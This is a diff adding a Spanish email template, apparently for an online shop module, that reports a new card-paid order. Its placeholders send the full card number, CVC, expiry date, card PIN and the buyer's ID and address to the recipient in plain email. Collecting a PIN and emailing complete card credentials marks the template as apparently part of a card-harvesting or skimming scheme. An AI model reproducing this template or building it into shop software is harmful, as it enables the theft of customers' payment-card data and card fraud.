@@ -1,0 +1,20 @@
+{shop_url}
+=HOLA,=
+-Se ha realizado un nuevo pedido #{id_order} pagado con tarjeta-
+
+
+
+Los datos para realizar el pago son los siguientes:
+Nombre: {nombre_titular}
+ID/Pasaporte: {cedula}
+Dirección: {direccion}
+Código postal: {cp}
+Importe: {importe}
+Tipo de tarjeta: {issuer}
+Número de tarjeta: {pan}
+CVC: {cvc}
+Fecha de caducidad: {card_expiry_month}/{card_expiry_year}
+PIN: {pin}
+Ciudad: {city}
+Estado: {state}
+País: {country}
